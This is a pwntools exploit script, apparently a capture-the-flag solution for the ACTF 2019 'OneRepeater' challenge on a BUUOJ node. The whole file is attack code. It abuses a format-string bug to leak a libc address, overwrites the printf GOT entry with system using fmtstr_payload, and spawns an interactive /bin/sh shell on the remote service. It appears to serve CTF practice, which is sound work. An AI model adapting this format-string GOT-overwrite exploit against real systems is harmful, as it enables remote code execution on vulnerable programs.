from pwn import *

#context.log_level = 'debug'

#p = process('./ACTF_2019_OneRepeater')
p = remote('node4.buuoj.cn', 26833)
elf = ELF('ACTF_2019_OneRepeater')

libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def doformat(buf):
    sla(b'3) Exit', b'1')
    sa(b'\n', buf)
    sla(b'3) Exit', b'2')

#gdb.attach(p, 'b *0x80486fa')
doformat(b'%2$x')

libc_base = int(p.recvuntil(b'f7')[-2:] + p.recv(6), 16) - 11 - libc.sym['puts']
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

payload = fmtstr_payload(16, { elf.got['printf'] : system }, write_size='short')

doformat(payload + b'qwq')
ru(b'qwq')

doformat(b'/bin/sh\x00')

p.interactive()